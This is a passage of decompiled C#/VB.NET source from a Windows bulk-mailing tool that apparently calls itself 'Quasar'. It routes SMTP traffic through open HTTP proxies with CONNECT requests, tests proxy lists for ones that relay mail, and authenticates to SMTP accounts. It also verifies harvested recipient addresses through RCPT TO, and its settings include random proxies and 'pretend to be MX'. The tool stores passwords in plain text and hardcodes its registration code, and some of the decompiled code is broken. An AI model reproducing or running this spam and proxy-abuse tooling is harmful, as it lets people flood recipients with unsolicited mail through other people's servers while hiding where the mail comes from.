            this.Listlog.Items.Add((object) "SENDBYTES:255");
            byte[] bytes1 = Encoding.ASCII.GetBytes("CONNECT mail.atekcomputers.com:25 HTTP/1.0\r\n\r\n");
            stream.Write(bytes1, 0, bytes1.Length);
            this.Listlog.Items.Add((object) "Before read");
            stream.Read(numArray, 0, tcpClient.ReceiveBufferSize);
            string str = Encoding.ASCII.GetString(numArray);
            this.Listlog.Items.Add((object) str);
            if (StringType.StrCmp(str.Substring(0, 10), "HTTP/1.0 2", false) == 0)
            {
              byte[] bytes2 = Encoding.ASCII.GetBytes("HELO Test \r\n");
              stream.Write(bytes2, 0, bytes2.Length);
              stream.Read(numArray, 0, tcpClient.ReceiveBufferSize);
              Encoding.ASCII.GetString(numArray);
              byte[] bytes3 = Encoding.ASCII.GetBytes("VRFY People\r\n");
              stream.Write(bytes3, 0, bytes3.Length);
              stream.Read(numArray, 0, tcpClient.ReceiveBufferSize);
              this.Listlog.Items.Add((object) Encoding.ASCII.GetString(numArray));
            }
            else
            {
              int num = (int) Interaction.MsgBox((object) "BAD HTTP Proxy!");
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else
        {
          this.Listlog.Items.Add((object) " Stopped");
          Application.ExitThread();
        }
      }
      else
      {
        int num1 = (int) Interaction.MsgBox((object) "Put in the registration code");
      }
    }

    private void Send_Click(object sender, EventArgs e) => new Thread(new ThreadStart(this.SMTPAUTHSend)).Start();

    private void Uselistbox_Click(object sender, EventArgs e)
    {
      if (!this.Uselistbox.Checked)
        this.Uselistbox.Checked = true;
      else
        this.Uselistbox.Checked = false;
    }

    private void Save_Click(object sender, EventArgs e)
    {
      int num1 = (int) this.SaveFileDialog1.ShowDialog();
      try
      {
        int num2 = 0;
        StreamWriter streamWriter = new StreamWriter(this.SaveFileDialog1.FileName);
        int count = this.Proxylist2.Items.Count;
        int num3 = 1;
        while (num3 <= count)
        {
          this.Proxylist2.SelectedIndex = num2;
          streamWriter.WriteLine(this.Proxylist2.SelectedItem.ToString());
          checked { ++num2; }
          checked { ++num3; }
        }
        streamWriter.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void MenuItem24_Click(object sender, EventArgs e)
    {
      this.MailingList.Show();
      this.SmtpAuth.Visible = false;
      this.Panel2.Visible = false;
    }

    private void Button1_Click_1(object sender, EventArgs e) => this.MailingList.Hide();

    private void MenuItem6_Click(object sender, EventArgs e)
    {
      this.Status.Text = "Stopped";
      Thread thread1 = new Thread(new ThreadStart(this.SMTPAUTHSend));
      while (false)
        thread1.Abort();
      Thread thread2 = new Thread(new ThreadStart(this.SMTPAUTHSen));
      while (false)
        thread2.Abort();
      this.Stopchecking.Checked = true;
      int num = (int) Interaction.MsgBox((object) "Sending Canceled");
      if (this.ListBox1.Items.Count != 1)
        return;
      this.ListBox1.Items.Clear();
    }

    private void Form1_closed(object sender, EventArgs e)
    {
      Thread thread = new Thread(new ThreadStart(this.SMTPAUTHSend));
      while (false)
        thread.Abort();
      try
      {
        Interaction.SaveSetting("Quasar", "start up", "RECIPIENT", this.Recipient.Text.ToString());
        Interaction.SaveSetting("Quasar", "start up", "from", this.From.Text.ToString());
        Interaction.SaveSetting("Quasar", "start up", "Subject", this.Subject.Text.ToString());
        Interaction.SaveSetting("Quasar", "start up", "BODY", this.Body.Text.ToString());
        Interaction.SaveSetting("Quasar", "start up", "username", this.username.Text.ToString());
        Interaction.SaveSetting("Quasar", "start up", "password", this.password.Text.ToString());
        Interaction.SaveSetting("Quasar", "start up", "smtp", this.smtp.Text.ToString());
        Interaction.SaveSetting("Quasar", "start up", "pop3", this.pop3.Text.ToString());
        Interaction.SaveSetting("Quasar", "start up", "Proxy", this.Proxy.Text.ToString());
        Interaction.SaveSetting("Quasar", "start up", "RealEmail", this.RealEmail.Text.ToString());
        Interaction.SaveSetting("Quasar", "start up", "Accountlist", this.Accountlist.Items.Count.ToString());
        Interaction.SaveSetting("Quasar", "start up", "Reply", this.ReplyTo.Text.ToString());
        Interaction.SaveSetting("Quasar", "start up", "ToName", this.ToName.Text.ToString());
        Interaction.SaveSetting("Quasar", "start up", "Fromname", this.Fromname.Text.ToString());
        Interaction.SaveSetting("Quasar", "start up", "Sylonious", this.Sylonious.ToString());
        Interaction.SaveSetting("Quasar", "start up", "Useaccount", this.Useaccount);
        Interaction.SaveSetting("Quasar", "start up", "UsePop", this.UsePop);
        Interaction.SaveSetting("Quasar", "start up", "Builtin", this.UseBuiltinSMTP);
        Interaction.SaveSetting("Quasar", "start up", "Pretendbemx", this.Pretendbemx);
        Interaction.SaveSetting("Quasar", "start up", "RandomProxies", this.RandomProxies);
        string Setting;
        Interaction.SaveSetting("Quasar", "start up", "bypass", Setting);
        this.Htmlcheck = !this.HTML.Checked ? "no" : "yes";
        Interaction.SaveSetting("Quasar", "start up", "Htmlcheck", this.Htmlcheck);
        this.Stopchecking.Checked = true;
        this.ListBox1.Items.Clear();
        Application.Exit();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Application.Exit();
    }

    private void Button6_Click(object sender, EventArgs e)
    {
      Cursor.Current = Cursors.WaitCursor;
      new Thread(new ThreadStart(this.SMTPAUTHSend)).Start();
      Cursor.Current = Cursors.Default;
    }

    private void Button5_Click(object sender, EventArgs e) => new Thread(new ThreadStart(this.mxprocess)).Start();

    public void mxprocess()
    {
      this.ListBox1.Items.Add((object) this.Recipient.Text);
      int count = this.ListBox1.Items.Count;
      int num = 1;
      while (num <= count)
      {
        this.ListBox1.SelectedIndex = checked (num - 1);
        string host = this.ListBox1.SelectedItem.ToString().Split('@')[1];
        StringType.FromInteger(checked (DateTime.Now.Millisecond * 60));
        string serverAddress = StringType.FromObject(Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces\\{220F74AC-AB8C-4708-A3C3-EF2C4D98BA5E}\\").GetValue("nameserver", (object) "202.12.27.33"));
        IntegerType.FromString("53");
        this.Mailserver1 = (string) null;
        while (StringType.StrCmp(this.Mailserver1, (string) null, false) == 0)
          this.Mailserver1 = this.getMXRecords(host, serverAddress);
        TcpClient tcpClient = new TcpClient();
        string[] strArray = this.Proxy.Text.Split(':');
        tcpClient.Connect(strArray[0], IntegerType.FromString(strArray[1]));
        NetworkStream stream = tcpClient.GetStream();
        byte[] bytes1 = Encoding.ASCII.GetBytes("EHLO Test\r\n");
        byte[] numArray = new byte[checked (tcpClient.ReceiveBufferSize + 1)];
        stream.Write(bytes1, 0, bytes1.Length);
        stream.Read(numArray, 0, tcpClient.ReceiveBufferSize);
        Console.WriteLine("Host returned2: " + Encoding.ASCII.GetString(numArray));
        this.Listlog.Refresh();
        byte[] bytes2 = Encoding.UTF8.GetBytes("MAIL FROM:" + this.From.Text + "\r\n");
        stream.Write(bytes2, 0, bytes2.Length);
        stream.Read(numArray, 0, tcpClient.ReceiveBufferSize);
        Encoding.ASCII.GetString(numArray);
        byte[] bytes3 = Encoding.UTF8.GetBytes(StringType.FromObject(ObjectType.StrCatObj(ObjectType.StrCatObj((object) "RCPT TO:", this.ListBox1.SelectedItem), (object) "\r\n")));
        stream.Write(bytes3, 0, bytes3.Length);
        stream.Read(numArray, 0, tcpClient.ReceiveBufferSize);
        if (StringType.StrCmp(Encoding.ASCII.GetString(numArray).Substring(0, 3), "250", false) == 0)
        {
          this.Listlog.Items.Add((object) "Address Ok");
        }
        else
        {
          this.ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(this.Listlog.SelectedItem));
          this.Listlog.Items.Add((object) "Address Bad!!!");
        }
        checked { ++num; }
      }
    }

    private void Addaccnt_Click(object sender, EventArgs e) => this.Accountlist.Items.Add((object) (this.smtp.Text + " " + this.pop3.Text + " " + this.username.Text + " " + this.password.Text + " " + this.RealEmail.Text));

    private void MenuItem9_Click(object sender, EventArgs e) => new Thread(new ThreadStart(this.mxprocess)).Start();

    private void Delete_Click(object sender, EventArgs e) => this.Proxylist2.Items.Remove(RuntimeHelpers.GetObjectValue(this.Proxylist2.SelectedItem));

    private void Button7_Click(object sender, EventArgs e) => this.Proxylist2.Items.Add((object) this.Proxy.Text);

    public void CheckHttpproxies(string Proxy)
    {
      string str1 = Proxy;
      this.Stopchecking.Checked = false;
      if (StringType.StrCmp(this.Sylonious, "Yes", false) == 0)
      {
        int num1 = 0;
        int num2 = 1;
        do
        {
          string text = this.smtp.Text;
          if (!this.Stopchecking.Checked)
          {
            try
            {
              string[] strArray = str1.ToString().Split(':');
              TcpClient tcpClient = new TcpClient();
              tcpClient.Connect(strArray[0], IntegerType.FromString(strArray[1]));
              tcpClient.ReceiveTimeout = 5000;
              tcpClient.ReceiveTimeout = 5000;
              byte[] numArray = new byte[checked (tcpClient.ReceiveBufferSize + 1)];
              NetworkStream stream = tcpClient.GetStream();
              if (StringType.StrCmp(this.smtp.Text, (string) null, false) == 0)
                ;
              byte[] bytes1 = Encoding.ASCII.GetBytes("CONNECT " + this.Mailserver + ":25" + " HTTP/1.0" + "\r\n\r\n");
              stream.Write(bytes1, 0, bytes1.Length);
              stream.Read(numArray, 0, tcpClient.ReceiveBufferSize);
              string str2 = Encoding.ASCII.GetString(numArray);
              if (((StringType.StrCmp(str2.Substring(0, 10), "HTTP/1.0 2", false) == 0 ? 1 : 0) << 31 >> 31 & ~str2.IndexOf("ERROR")) != 0)
              {
                byte[] bytes2 = Encoding.ASCII.GetBytes("HELO Test\r\n");
                stream.Write(bytes2, 0, bytes2.Length);
                stream.Read(numArray, 0, tcpClient.ReceiveBufferSize);
                if (Encoding.ASCII.GetString(numArray).IndexOf("220") != 0)
                  this.Proxylist2.Items.Add((object) Proxy);
              }
              else if (num1 <= 1)
              {
                checked { --num2; }
                checked { ++num1; }
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              if (num1 > 1)
              {
                Application.ExitThread();
              }
              else
              {
                checked { --num2; }
                checked { ++num1; }
              }
              ProjectData.ClearProjectError();
            }
          }
          else
            Application.ExitThread();
          checked { ++num2; }
        }
        while (num2 <= 1);
      }
      else
      {
        int num = (int) Interaction.MsgBox((object) "Put in the registration code");
      }
      Application.ExitThread();
    }

    private void OnConnect(IAsyncResult ar)
    {
      try
      {
        this.sock.EndConnect(ar);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Button8_Click(object sender, EventArgs e)
    {
      this.Proxylist.Items.Clear();
      this.Proxylist2.Items.Clear();
    }

    private void Button9_Click(object sender, EventArgs e) => this.Accountlist.Items.Clear();

    private void Button10_Click(object sender, EventArgs e)
    {
      if (StringType.StrCmp(this.textbox1111.Text, "jav3241fdpt35v91ac", false) == 0)
      {
        int num = (int) Interaction.MsgBox((object) "OK");
        this.Sylonious = "Yes";
        this.Button10.Hide();
        this.textbox1111.Hide();
        this.Label21.Hide();
      }
      else
      {
        int num1 = (int) Interaction.MsgBox((object) "Wrong Registeration Code");
      }
    }

    private void OpenProxy_Click(object sender, EventArgs e) => new Thread(new ThreadStart(this.OpenPro)).Start();

    private void Proxylist2_SelectedIndexChanged(object sender, EventArgs e) => this.Proxy.Text = StringType.FromObject(this.Proxylist2.SelectedItem);

    private void Button11_Click(object sender, EventArgs e) => new Thread(new ThreadStart(this.OpenPro2)).Start();

    private void Button12_Click(object sender, EventArgs e) => this.Panel3.Hide();

    private void log_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) => this.Panel3.Show();

    private void Button13_Click(object sender, EventArgs e) => this.Panel4.Visible = true;

    private void Button14_Click(object sender, EventArgs e) => this.Panel4.Visible = false;

    private void Button5_Click_2(object sender, EventArgs e)
    {
      this.Status.Text = "Stopped";
      Thread thread1 = new Thread(new ThreadStart(this.SMTPAUTHSend));
      while (false)
        thread1.Abort();
      Thread thread2 = new Thread(new ThreadStart(this.SMTPAUTHSen));
      while (false)
        thread2.Abort();
      this.Stopchecking.Checked = true;
      int num = (int) Interaction.MsgBox((object) "Sending Canceled");
      if (this.ListBox1.Items.Count != 1)
        return;
      this.ListBox1.Items.Clear();
    }

    private void OpenSmtp_Click(object sender, EventArgs e) => new Thread(new ThreadStart(this.OpenSmtp2)).Start();

    private void CheckSMTP()
    {
      int num1 = 1;
      do
      {
        try
        {
          TcpClient tcpClient = new TcpClient();
          string[] strArray = this.Proxy.Text.Split(':');
          tcpClient.Connect(strArray[0], IntegerType.FromString(strArray[1]));
          NetworkStream stream = tcpClient.GetStream();
          tcpClient.ReceiveTimeout = 1000;
          tcpClient.ReceiveTimeout = 1000;
          byte[] bytes1 = Encoding.ASCII.GetBytes("CONNECT " + this.smtp.Text + ":25 HTTP/1.0" + "\r\n" + "\r\n");
          stream.Write(bytes1, 0, bytes1.Length);
          byte[] numArray = new byte[checked (tcpClient.ReceiveBufferSize + 1)];
          Application.DoEvents();
          stream.Read(numArray, 0, tcpClient.ReceiveBufferSize);
          if (StringType.StrCmp(Encoding.ASCII.GetString(numArray).Substring(0, 10), "HTTP/1.0 2", false) == 0)
          {
            byte[] bytes2 = Encoding.ASCII.GetBytes("HELO MEME\r\n");
            stream.Write(bytes2, 0, bytes2.Length);
            Application.DoEvents();
            stream.Read(numArray, 0, tcpClient.ReceiveBufferSize);
            string str1 = Encoding.ASCII.GetString(numArray);
            this.Listlog.Items.Add((object) str1);
            if (StringType.StrCmp(str1.Substring(0, 1), "2", false) == 0)
            {
              Console.WriteLine("Host returned2: " + str1);
              string str2 = "<" + this.From.Text + ">";
              Convert.ToBase64String(Encoding.UTF8.GetBytes(this.username.Text));
              byte[] bytes3 = Encoding.ASCII.GetBytes("AUTH LOGIN\r\n");
              stream.Write(bytes3, 0, bytes3.Length);
              byte[] bytes4 = Encoding.UTF8.GetBytes(Convert.ToBase64String(Encoding.UTF8.GetBytes(this.username.Text)) + "\r\n");
              stream.Write(bytes4, 0, bytes4.Length);
              Application.DoEvents();
              stream.Read(numArray, 0, tcpClient.ReceiveBufferSize);
              string str3 = Encoding.ASCII.GetString(numArray);
              this.Listlog.Items.Add((object) str3);
              if (StringType.StrCmp(str3.Substring(0, 1), "2", false) == 0 | StringType.StrCmp(str3.Substring(0, 1), "3", false) == 0)
              {
                byte[] bytes5 = Encoding.UTF8.GetBytes(Convert.ToBase64String(Encoding.UTF8.GetBytes(this.password.Text)) + "\r\n");
                stream.Write(bytes5, 0, bytes5.Length);
                Thread.Sleep(1000);
                stream.Read(numArray, 0, tcpClient.ReceiveBufferSize);
                string str4 = Encoding.ASCII.GetString(numArray);
                this.Listlog.Items.Add((object) str4);
                if (StringType.StrCmp(str4.Substring(0, 1), "3", false) == 0 | StringType.StrCmp(str3.Substring(0, 1), "2", false) == 0)
                {
                  try
                  {
                    int num2 = (int) Interaction.MsgBox((object) "Ready to Send");
                    this.SmtpAuth.Hide();
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    ProjectData.ClearProjectError();
                  }
                }
                else
                {
                  int num3 = (int) Interaction.MsgBox((object) "Bad Password");
                }
              }
              else
              {
                int num4 = (int) Interaction.MsgBox((object) "Bad Username");
              }
            }
            else
            {
              int num5 = (int) Interaction.MsgBox((object) "Did not connect to SMTP");
            }
          }
          else
          {
            int num6 = (int) Interaction.MsgBox((object) "Did not connect to proxy");
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          this.Listlog.Items.Add((object) ex);
          ProjectData.ClearProjectError();
        }
        checked { ++num1; }
      }
      while (num1 <= 1);
    }

    private void Button20_Click(object sender, EventArgs e) => new Thread(new ThreadStart(this.CheckSMTP)).Start();

    private void pop3_TextChanged(object sender, EventArgs e)
    {
    }

    private void Button21_Click(object sender, EventArgs e) => new Thread(new ThreadStart(this.CheckSMTP)).Start();

    internal class MXRecord
    {
      public int preference;
      public string exchange;

      public MXRecord()
      {
        this.preference = -1;
        this.exchange = (string) null;
      }

      public override string ToString() => StringType.FromDouble(DoubleType.FromString("Preference : ") + (double) this.preference + DoubleType.FromString(" Exchange : ") + DoubleType.FromString(this.exchange));
    }
  }
}
